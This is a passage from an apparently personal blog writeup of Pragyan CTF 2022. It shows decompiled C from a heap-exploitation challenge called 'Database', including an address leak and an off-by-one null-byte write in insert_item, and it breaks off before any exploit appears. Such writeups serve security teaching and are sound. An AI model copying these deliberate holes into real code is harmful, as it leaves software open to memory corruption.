<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>Pragyan CTF 2022 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:site_name" content="Chovid99's Blog">
<meta property="og:title" content="Pragyan CTF 2022" />
<meta property="og:description" content="Writeup for Pragyan CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/pragyan-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-03-07T08:01:00+07:00" />
<meta property="article:modified_time" content="2022-03-07T08:01:00+07:00" />


<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://chovid99.github.io/site-feature-image.jpg"/>

<meta name="twitter:title" content="Pragyan CTF 2022"/>
<meta name="twitter:description" content="Writeup for Pragyan CTF 2022 by Chovid99"/>
<meta name="twitter:site" content="@https://twitter.com/Chovid99"/>


<meta name="generator" content="Hugo 0.95.0" />


  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />

 
    



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">‚Üê</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">Pragyan CTF 2022</h1>

    <div class="tip">
        <time datetime="2022-03-07 08:01:00 &#43;0700 WIB">Mar 7, 2022</time>
        <span class="split">
          ¬∑
        </span>
        <span>
          6749 words
        </span>
        <span class="split">
          ¬∑
        </span>
        <span>
          32 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p><p class="markdown-image">
  <img src="https://i.imgur.com/hcj0igf.png" alt=""  />
</p>
I spend my Sunday doing Pragyan CTF 2022. I&rsquo;m very grateful that I got 17th place even though I play it solo. Below is my writeup for challenges that I solved and don&rsquo;t forget to follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">Twitter</a> üôÇ</p>
<h2 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h2>
<h3 id="database">Database <a href="#database" class="anchor">#</a></h3>
<h4 id="intro">Intro <a href="#intro" class="anchor">#</a></h4>
<p>We were given a binary, let&rsquo;s decompile it. Below is the main function.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_18 [<span style="color:#f60">8</span>];
</span></span><span style="display:flex;"><span>  undefined8 local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  fflush(stdin);
</span></span><span style="display:flex;"><span>  welcome();
</span></span><span style="display:flex;"><span>  fprintf(stderr,<span style="color:#c30">&#34;This might help: %p</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,main);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>    menu();
</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,local_18,<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#555">=</span> atoll(local_18);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">switch</span>(uVar1 <span style="color:#555">&amp;</span> <span style="color:#f60">0xffffffff</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#c30">&#34;Invalid choice</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0xf</span>,stderr);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">1</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      print_items();
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">2</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      insert_item();
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">3</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      update_item();
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">4</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      delete_item();
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">5</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      leave();
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>      exit(<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    fflush(stdin);
</span></span><span style="display:flex;"><span>  } <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>insert_item</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">insert_item</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  size_t __size;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>pvVar1;
</span></span><span style="display:flex;"><span>  ssize_t sVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_3c;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_28 [<span style="color:#f60">24</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (len <span style="color:#555">&lt;</span> <span style="color:#f60">0x10</span>) {
</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#c30">&#34;Please enter the length of string =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x25</span>,stderr);
</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,local_28,<span style="color:#f60">0xc</span>);
</span></span><span style="display:flex;"><span>    __size <span style="color:#555">=</span> atoll(local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (__size <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#c30">&#34;Invalid length!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x10</span>,stderr);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">for</span> (local_3c <span style="color:#555">=</span> <span style="color:#f60">0</span>; local_3c <span style="color:#555">&lt;</span> <span style="color:#f60">0x10</span>; local_3c <span style="color:#555">=</span> local_3c <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_3c <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>(size_t <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_3c <span style="color:#555">*</span> <span style="color:#f60">0x10</span>) <span style="color:#555">=</span> __size;
</span></span><span style="display:flex;"><span>          pvVar1 <span style="color:#555">=</span> malloc(__size);
</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_3c <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">=</span> pvVar1;
</span></span><span style="display:flex;"><span>          fwrite(<span style="color:#c30">&#34;Please enter the string you want to save =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x2c</span>,stderr);
</span></span><span style="display:flex;"><span>          sVar2 <span style="color:#555">=</span> read(<span style="color:#f60">0</span>,<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_3c <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>),__size);
</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)(sVar2 <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_3c <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>)) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>          len <span style="color:#555">=</span> len <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#c30">&#34;Database is full!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x12</span>,stderr);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">==</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  __stack_chk_fail();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>delete_item</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">delete_item</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_18 [<span style="color:#f60">8</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (len <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
